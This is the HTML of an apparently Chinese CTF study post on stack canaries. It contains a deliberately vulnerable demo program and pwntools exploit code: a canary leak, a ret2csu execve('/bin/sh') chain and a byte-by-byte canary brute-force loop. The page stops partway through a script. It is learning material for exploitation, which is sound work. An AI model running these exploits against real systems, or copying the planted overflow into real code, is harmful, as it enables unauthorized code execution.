u64(s.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;)) - libc.symbols[&#39;setvbuf&#39;]	rdx_rsi_ret = libc.address + 0x1150c9	sh_addr = next(libc.search(&quot;/bin/sh&quot;))	execve_addr = libc.sym[&#39;execve&#39;]	payload = flat([&#39;2&#39; *8, rdi_ret, sh_addr, rdx_rsi_ret, 0, 0, execve_addr]).ljust(80,&#39;b&#39;)	payload += flat([fake_rbp - 0x30, leave_ret_addr])def main():	s.recv()	s.sendline(cyclic(100))	s.recvuntil(&quot;\x0a&quot;)	canary = u32(s.recv(3).rjust(4, &#39;\x00&#39;))	log.success(&quot;canary -&gt; {:#x}&quot;.format(canary))		getshell = elf.sym[&quot;getshell&quot;]		s.sendline(cyclic(100) + p32(canary) + &#39;a&#39;*12 + p32(getshell))	s.recv()	s.interactive()	if __name__==&#39;__main__&#39;:	main()	爆破canaryone-by-one对于 Canary，不仅每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，而且同一个进程中的每个线程的 Canary 也不同。 但是存在一类通过 fork 函数开启子进程交互的题目，因为 fork 函数会直接拷贝父进程的内存，因此每次创建的子进程的 Canary 是相同的。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary:print &quot;[+] Brute forcing stack canary &quot;start = len(p)stop = len(p)+8while len(p) &lt; stop:   for i in xrange(0,256):      res = send2server(p + chr(i))      if res != &quot;&quot;:         p = p + chr(i)         #print &quot;\t[+] Byte found 0x%02x&quot; % i         break      if i == 255:         print &quot;[-] Exploit failed&quot;         sys.exit(-1)canary = p[stop:start-1:-1].encode(&quot;hex&quot;)print &quot;   [+] SSP value is 0x%s&quot; % canary劫持__stack_chk_fail 函数已知 Canary 失败的处理逻辑会进入到 __stack_chk_failed 函数，__stack_chk_failed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。覆盖 TLS 中储存的 Canary 值已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。">
  <meta name="twitter:url" content="https://zjgcjy.github.io/posts/2019-03/Pwnit-1.html">

  
    <meta name="twitter:card" content="summary">
    
      <meta name="twitter:image" content="https://zjgcjy.github.io/assets/images/bio-photo.jpg">
    
  

  



  <meta property="article:published_time" content="2019-03-01T03:49:00+08:00">





  

  


<link rel="canonical" href="https://zjgcjy.github.io/posts/2019-03/Pwnit-1.html">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Blogger",
      "url": "https://zjgcjy.github.io/",
      "sameAs": ["https://twitter.com/","https://github.com/"]
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="My way, though far away Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/apple-touch-icon.png" alt=""></a>
        
        <a class="site-title" href="/">
          ZJGCJY
          <span class="site-subtitle">My way, though far away</span>
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/collection-archive/" >Collections</a>
            </li><li class="masthead__menu-item">
              <a href="/about.html" >About</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/me.jpg" alt="zjgcjy" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">zjgcjy</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>IIE UCAS, CTFer, Binarian</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fa fa-map-marker" aria-hidden="true"></i> <span itemprop="name">BeiJing China</span>
        </li>
      

      
        
          
            <li><a href="https://zjgcjy.github.io" rel="nofollow noopener noreferrer"><i class="fa fa-link" aria-hidden="true"></i> Website</a></li>
          
        
          
            <li><a href="mailto:zjgcjy@gmail.com" rel="nofollow noopener noreferrer"><i class="fa fa-envelope-square" aria-hidden="true"></i> Email</a></li>
          
        
          
            <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></li>
          
        
          
            <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Pwnit 1">
    <meta itemprop="description" content="  pwn学习资料，来自ctf-wiki。安全机制-CanaryCanarycanary 不管是实现还是设计思想都比较简单高效，就是插入一个值，在 stack overflow 发生的 高危区域的尾部，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。原理：-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护-fno-stack-protector 禁用保护.Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配。当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：mov    rax, qword ptr fs:[0x28]mov    qword ptr [rbp - 8], rax在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。mov    rdx,QWORD PTR [rbp-0x8]xor    rdx,QWORD PTR fs:0x28je     0x4005d7 &lt;main+65&gt;call   0x400460 &lt;__stack_chk_fail@plt&gt;如果 canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，glibc2.28中定义如下。这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。事实上，TLS 中的值由函数 security_init 进行初始化。Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。demo源代码如下：#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void getshell(void) {    system(&quot;/bin/sh&quot;);}void init() {    setbuf(stdin, NULL);    setbuf(stdout, NULL);    setbuf(stderr, NULL);}void vuln() {    char buf[100];    for(int i=0;i&lt;2;i++){        read(0, buf, 0x200);        printf(buf);    }}int main(void) {    init();    puts(&quot;Hello Hacker!&quot;);    vuln();    return 0;}编译为 32bit 程序，开启 NX，ASLR，Canary 保护。makefile文件如下。CC = gccSRCS = canary.cEXEC = $(SRCS:.c=)X86 = -m32X64 = DEBUG = -g# ------------- security ----------------NO_CANARY = -fno-stack-protectorCANARY = -fstack-protectorALL_CANARY = -fstack-protector-allNO_NX = -z execstackNX = -z noexecstackNO_PIE = -no-piePIE = -fpie -pieALL_PIE = -fPIE -pieNO_RELRO = -z norelroPART_RELRO = -z lazyALL_RELRO = -z now# ------------- security ----------------# X86 DEBUG NO_CANARY NO_NX NO_PIE PART_RELROALL_NO = $(X86) $(DEBUG) $(NO_CANARY) $(NO_NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG NO_CANARY NX NO_PIE PART_RELROONLY_NX = $(X86) $(DEBUG) $(NO_CANARY) $(NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG CANARY NX NO_PIE PART_RELROCANARY_NX = $(X86) $(DEBUG) $(CANARY) $(NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG CANARY NX PIE PART_RELROCANARY_NX_PIE = $(X86) $(DEBUG) $(CANARY) $(NX) $(PIE) $(PART_RELRO)CFLAGS = $(CANARY_NX)${EXEC}:	$(CC) $(CFLAGS) $(SRCS) -o $(EXEC)all:	${EXEC}clean:	rm $(EXEC)首先通过覆盖 Canary 最后一个 \x00 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中。#!/usr/bin/env python# -*- coding: utf-8 -*-__author__=&#39;zjgcjy&#39;import osimport sysfrom pwn import *#from LibcSearcher import *usage = &#39;&#39;&#39;	usage: python2 exp.py file index &#39;&#39;&#39;if len(sys.argv) != 3:	print usage	exit(-1)vul = &#39;./&#39; + sys.argv[1]elf = ELF(vul)context.arch = elf.archcontext.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]index = eval(sys.argv[2])if index == 0:	context.log_level = &#39;debug&#39;	libc = elf.libc	s = process(vul)elif index == 1:    context.log_level = &#39;debug&#39;    libc = elf.libc    s = gdb.debug(vul, &#39;&#39;&#39;break _startcontinueb main&#39;&#39;&#39;)    pause()elif index == 2:	context.log_level = &#39;debug&#39;	libc = elf.libc	s = process(vul)	#gdb.attach(proc.pidof(s)[0])	gdb.attach(s, &quot;b main&quot;)	pause()elif index == 3:	context.log_level = &#39;debug&#39;	lib = &#39;~/work/ctf/2019/tamuctf/pwn/3/libc.so.6&#39;	libc = ELF(lib)	s = process(vul, env={&#39;LD_PRELOAD&#39;: lib})		gdb.attach(s, &quot;b * 0x40080b&quot;)	pause()elif index == 4:	context.log_level = &#39;debug&#39;	ip = &#39;pwn.jarvisoj.com&#39; 	port = 1234	s = remote(ip, port)    else:	print &#39;wrong&#39;def libSearch(addr, fname = &#39;write&#39;):	obj = LibcSearcher(fname, addr)	#obj.db = &#39;libc6_2.23-0ubuntu10_i386.symbols&#39;	libc_base = addr - obj.dump(fname)	system_addr = libc_base + obj.dump(&#39;system&#39;)	binsh_addr = libc_base + obj.dump(&#39;str_bin_sh&#39;)	execve_addr = libc_base + obj.dump(&#39;execve&#39;)	log.success(&quot;libc_base -&gt; {:#x}&quot;.format(libc_base))&#39;&#39;&#39;d = DynELF(leak, elf = ELF(argv[1]))system_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)success(&quot;system_addr -&gt; {:#x}&quot;.format(system_addr))&#39;&#39;&#39;def leak(address, ret, offset, length = 4):    payload = &#39;a&#39; * offset + p32(elf.plt[&#39;write&#39;]) + p32(ret)     payload += p32(1) + p32(address) + p32(length)    s.send(payload)    data = s.recv(length)    log.info(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datadef csu(offset, r12, r15, r14, r13, ret, rbx = 0, rbp = 1):    # pop rbx,rbp,r12,r13,r14,r15    # rbx = 0,    # rbp = 1    # call r12    # rdi = edi = r15d    # rsi = r14    # rdx = r13    payload = &#39;a&#39; * offset + p64(csu_second_addr)    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)    payload += p64(csu_first_addr)    payload += &#39;a&#39; * 0x38    payload += p64(ret)    s.send(payload)    sleep(0.5)def csu_make():	csu_first_addr = 0x4005F0	csu_second_addr = 0x40060A	main_addr = 0x40057D	s.recv()	# write(1,got[&#39;write&#39;],8)	csu(136, elf.got[&#39;write&#39;], 1, elf.got[&#39;write&#39;], 8, main_addr)	libc.address = u64(s.recv(8)) - libc.symbols[&#39;write&#39;]	log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))	s.recv()	# read(0,bss,16)	# read execve_addr and /bin/sh\x00	csu(136, elf.got[&#39;read&#39;], 0, elf.bss(), 16, main_addr)	s.send(p64(libc.symbols[&#39;execve&#39;]) + &#39;/bin/sh\x00&#39;)	s.recv()	# execve(&#39;/bin/sh&#39;, 0, 0)	csu(136, elf.bss(), elf.bss()+8, 0, 0, 0xdeadbeef)	s.interactive()def exception_canary():	environ_addr = libc.symbols[&#39;environ&#39;]	payload = flat([cyclic(0x128), environ_addr])	stack_address = u64(s.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;))	success(&quot;stack_address -&gt; {:#x}&quot;.format(stack_address))	payload = flat([cyclic(0x128), stack_address - 0x168])	payload = flat([&#39;1&#39;*8, rdi_ret, elf.got[&#39;setvbuf&#39;], elf.plt[&#39;puts&#39;], vuln_addr]).ljust(80, &#39;a&#39;)	payload += flat([fake_rbp, leave_ret_addr])	libc.address = u64(s.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;)) - libc.symbols[&#39;setvbuf&#39;]	rdx_rsi_ret = libc.address + 0x1150c9	sh_addr = next(libc.search(&quot;/bin/sh&quot;))	execve_addr = libc.sym[&#39;execve&#39;]	payload = flat([&#39;2&#39; *8, rdi_ret, sh_addr, rdx_rsi_ret, 0, 0, execve_addr]).ljust(80,&#39;b&#39;)	payload += flat([fake_rbp - 0x30, leave_ret_addr])def main():	s.recv()	s.sendline(cyclic(100))	s.recvuntil(&quot;\x0a&quot;)	canary = u32(s.recv(3).rjust(4, &#39;\x00&#39;))	log.success(&quot;canary -&gt; {:#x}&quot;.format(canary))		getshell = elf.sym[&quot;getshell&quot;]		s.sendline(cyclic(100) + p32(canary) + &#39;a&#39;*12 + p32(getshell))	s.recv()	s.interactive()	if __name__==&#39;__main__&#39;:	main()	爆破canaryone-by-one对于 Canary，不仅每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，而且同一个进程中的每个线程的 Canary 也不同。 但是存在一类通过 fork 函数开启子进程交互的题目，因为 fork 函数会直接拷贝父进程的内存，因此每次创建的子进程的 Canary 是相同的。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary:print &quot;[+] Brute forcing stack canary &quot;start = len(p)stop = len(p)+8while len(p) &lt; stop:   for i in xrange(0,256):      res = send2server(p + chr(i))      if res != &quot;&quot;:         p = p + chr(i)         #print &quot;\t[+] Byte found 0x%02x&quot; % i         break      if i == 255:         print &quot;[-] Exploit failed&quot;         sys.exit(-1)canary = p[stop:start-1:-1].encode(&quot;hex&quot;)print &quot;   [+] SSP value is 0x%s&quot; % canary劫持__stack_chk_fail 函数已知 Canary 失败的处理逻辑会进入到 __stack_chk_failed 函数，__stack_chk_failed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。覆盖 TLS 中储存的 Canary 值已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。">
    <meta itemprop="datePublished" content="March 01, 2019">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Pwnit 1
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  9 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#canary">Canary</a></li>
  <li><a href="#demo">demo</a></li>
  <li><a href="#爆破canary">爆破canary</a>
    <ul>
      <li><a href="#one-by-one">one-by-one</a></li>
      <li><a href="#劫持__stack_chk_fail-函数">劫持__stack_chk_fail 函数</a></li>
      <li><a href="#覆盖-tls-中储存的-canary-值">覆盖 TLS 中储存的 Canary 值</a></li>
    </ul>
  </li>
</ul>
            </nav>
          </aside>
        
        <blockquote>
  <p>pwn学习资料，来自ctf-wiki。
安全机制-Canary</p>
</blockquote>

<hr />

<h1 id="canary">Canary</h1>

<p>canary 不管是实现还是设计思想都比较简单高效，就是插入一个值，在 stack overflow 发生的 高危区域的尾部，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。</p>

<p><strong>原理：</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="n">fstack</span><span class="o">-</span><span class="n">protector</span> <span class="err">启用保护，不过只为局部变量中含有数组的函数插入保护</span>
<span class="o">-</span><span class="n">fstack</span><span class="o">-</span><span class="n">protector</span><span class="o">-</span><span class="n">all</span> <span class="err">启用保护，为所有函数插入保护</span>
<span class="o">-</span><span class="n">fstack</span><span class="o">-</span><span class="n">protector</span><span class="o">-</span><span class="n">strong</span>
<span class="o">-</span><span class="n">fstack</span><span class="o">-</span><span class="n">protector</span><span class="o">-</span><span class="n">explicit</span> <span class="err">只对有明确</span><span class="n">stack_protect</span> <span class="n">attribute</span><span class="err">的函数开启保护</span>
<span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">protector</span> <span class="err">禁用保护</span><span class="p">.</span>
</code></pre></div></div>

<p>Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配。</p>

<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>

<pre><code class="language-asm">mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp - 8], rax
</code></pre>

<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>

<pre><code class="language-asm">mov    rdx,QWORD PTR [rbp-0x8]
xor    rdx,QWORD PTR fs:0x28
je     0x4005d7 &lt;main+65&gt;
call   0x400460 &lt;__stack_chk_fail@plt&gt;
</code></pre>

<p>如果 canary 已经被非法修改，此时程序流程会走到 <code class="highlighter-rouge">__stack_chk_fail</code>。<code class="highlighter-rouge">__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，glibc2.28中定义如下。</p>

<p><img src="/img/2019-03/Snipaste_2019-03-01_09-02-40.png" alt="Snipaste_2019-03-01_09-02-40" /></p>

<p><img src="/img/2019-03/Snipaste_2019-03-01_09-05-35.png" alt="Snipaste_2019-03-01_09-05-35" /></p>

<p>这意味可以通过劫持 <code class="highlighter-rouge">__stack_chk_fail</code>的 got 值劫持流程或者利用 <code class="highlighter-rouge">__stack_chk_fail</code> 泄漏内容 (参见 stack smash)。</p>

<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>

<p><img src="/img/2019-03/Snipaste_2019-03-01_09-11-25.png" alt="Snipaste_2019-03-01_09-11-25" /></p>

<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p>

<p>事实上，TLS 中的值由函数 security_init 进行初始化。</p>

<p><img src="/img/2019-03/Snipaste_2019-03-01_09-12-26.png" alt="Snipaste_2019-03-01_09-12-26" /></p>

<p>Canary 设计为以字节 <code class="highlighter-rouge">\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p>

<h1 id="demo">demo</h1>

<p>源代码如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span><span class="kt">void</span> <span class="nf">getshell</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">init</span><span class="p">();</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Hello Hacker!"</span><span class="p">);</span>
    <span class="n">vuln</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>编译为 32bit 程序，开启 NX，ASLR，Canary 保护。makefile文件如下。</p>

<div class="language-makefile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">CC</span> <span class="o">=</span> gcc
<span class="nv">SRCS</span> <span class="o">=</span> canary.c
<span class="nv">EXEC</span> <span class="o">=</span> <span class="nv">$(SRCS:.c=)</span>

<span class="nv">X86</span> <span class="o">=</span> <span class="nt">-m32</span>
<span class="nv">X64</span> <span class="o">=</span> 
<span class="nv">DEBUG</span> <span class="o">=</span> <span class="nt">-g</span>

<span class="c"># ------------- security ----------------
</span><span class="nv">NO_CANARY</span> <span class="o">=</span> <span class="nt">-fno-stack-protector</span>
<span class="nv">CANARY</span> <span class="o">=</span> <span class="nt">-fstack-protector</span>
<span class="nv">ALL_CANARY</span> <span class="o">=</span> <span class="nt">-fstack-protector-all</span>

<span class="nv">NO_NX</span> <span class="o">=</span> <span class="nt">-z</span> execstack
<span class="nv">NX</span> <span class="o">=</span> <span class="nt">-z</span> noexecstack

<span class="nv">NO_PIE</span> <span class="o">=</span> <span class="nt">-no-pie</span>
<span class="nv">PIE</span> <span class="o">=</span> <span class="nt">-fpie</span> <span class="nt">-pie</span>
<span class="nv">ALL_PIE</span> <span class="o">=</span> <span class="nt">-fPIE</span> <span class="nt">-pie</span>

<span class="nv">NO_RELRO</span> <span class="o">=</span> <span class="nt">-z</span> norelro
<span class="nv">PART_RELRO</span> <span class="o">=</span> <span class="nt">-z</span> lazy
<span class="nv">ALL_RELRO</span> <span class="o">=</span> <span class="nt">-z</span> now
<span class="c"># ------------- security ----------------
</span>
<span class="c"># X86 DEBUG NO_CANARY NO_NX NO_PIE PART_RELRO
</span><span class="nv">ALL_NO</span> <span class="o">=</span> <span class="nv">$(X86)</span> <span class="nv">$(DEBUG)</span> <span class="nv">$(NO_CANARY)</span> <span class="nv">$(NO_NX)</span> <span class="nv">$(NO_PIE)</span> <span class="nv">$(PART_RELRO)</span>

<span class="c"># X86 DEBUG NO_CANARY NX NO_PIE PART_RELRO
</span><span class="nv">ONLY_NX</span> <span class="o">=</span> <span class="nv">$(X86)</span> <span class="nv">$(DEBUG)</span> <span class="nv">$(NO_CANARY)</span> <span class="nv">$(NX)</span> <span class="nv">$(NO_PIE)</span> <span class="nv">$(PART_RELRO)</span>

<span class="c"># X86 DEBUG CANARY NX NO_PIE PART_RELRO
</span><span class="nv">CANARY_NX</span> <span class="o">=</span> <span class="nv">$(X86)</span> <span class="nv">$(DEBUG)</span> <span class="nv">$(CANARY)</span> <span class="nv">$(NX)</span> <span class="nv">$(NO_PIE)</span> <span class="nv">$(PART_RELRO)</span>

<span class="c"># X86 DEBUG CANARY NX PIE PART_RELRO
</span><span class="nv">CANARY_NX_PIE</span> <span class="o">=</span> <span class="nv">$(X86)</span> <span class="nv">$(DEBUG)</span> <span class="nv">$(CANARY)</span> <span class="nv">$(NX)</span> <span class="nv">$(PIE)</span> <span class="nv">$(PART_RELRO)</span>

<span class="nv">CFLAGS</span> <span class="o">=</span> <span class="nv">$(CANARY_NX)</span>

<span class="nl">${EXEC}</span><span class="o">:</span>
	<span class="nv">$(CC)</span> <span class="nv">$(CFLAGS)</span> <span class="nv">$(SRCS)</span> <span class="nt">-o</span> <span class="nv">$(EXEC)</span>

<span class="nl">all</span><span class="o">:</span>
	<span class="nv">${EXEC}</span>

<span class="nl">clean</span><span class="o">:</span>
	<span class="nb">rm</span> <span class="nv">$(EXEC)</span>
</code></pre></div></div>

<p>首先通过覆盖 Canary 最后一个 <code class="highlighter-rouge">\x00</code> 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中。</p>

<p><img src="/img/2019-03/Snipaste_2019-02-28_19-59-50.png" alt="Snipaste_2019-02-28_19-59-50" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
# -*- coding: utf-8 -*-
</span><span class="n">__author__</span><span class="o">=</span><span class="s">'zjgcjy'</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1">#from LibcSearcher import *
</span>
<span class="n">usage</span> <span class="o">=</span> <span class="s">'''
	usage: python2 exp.py file index '''</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
	<span class="k">print</span> <span class="n">usage</span>
	<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="n">vul</span> <span class="o">=</span> <span class="s">'./'</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">vul</span><span class="p">)</span>
